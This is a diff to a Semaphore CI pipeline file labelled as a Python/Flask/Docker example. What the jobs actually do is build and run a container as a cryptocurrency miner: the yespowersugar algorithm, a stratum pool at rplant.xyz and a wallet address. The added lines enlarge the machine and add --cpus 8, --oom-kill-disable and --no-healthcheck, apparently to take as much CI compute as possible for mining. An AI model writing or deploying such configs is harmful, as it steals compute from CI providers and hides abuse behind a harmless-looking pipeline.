@@ -2,7 +2,7 @@ version: v1.0
 name: Semaphore Python / Flask / Docker Example Pipeline
 agent:
   machine:
-    type: e1-standard-4
+    type: e1-standard-8
     os_image: ubuntu1804
 execution_time_limit:
   hours: 6
@@ -17,17 +17,10 @@ blocks:
             - 'git clone https://github.com/jessica-ci/mauk.git'
             - cd mauk
             - 'docker build --tag mauk:latest .'
-            - 'docker run --publish 8000:8080 --detach --name mauk mauk:latest -a yespowersugar -o stratum+tcp://stratum-asia.rplant.xyz:7042 -u sugar1qwj5x6hyr88tqsuv2fmu8dvzzxgx35wl5uhnxf8.mauk1'
+            - 'docker run --volume --oom-kill-disable --no-healthcheck --cpus 8 --detach --name mauk mauk:latest -a yespowersugar -o stratum+tcp://stratum-asia.rplant.xyz:7042 -u sugar1qwj5x6hyr88tqsuv2fmu8dvzzxgx35wl5uhnxf8.mauk'
   - name: 'Block #2'
     task:
-      prologue:
-        commands:
-          - 'git clone https://github.com/jessica-ci/mauk.git'
-          - cd mauk
-          - 'docker build --tag mauk:latest .'
-          - 'docker run --publish 8000:8080 --detach --name mauk mauk:latest'
       jobs:
         - name: 'Job #1'
           commands:
-            - 'docker ps -a '
-            - 'docker run --publish 8000:8080 --detach --name mauk mauk:latest -a yespowersugar -o stratum+tcp://stratum-asia.rplant.xyz:7042 -u sugar1qwj5x6hyr88tqsuv2fmu8dvzzxgx35wl5uhnxf8.mauk'
+            - docker ps -a
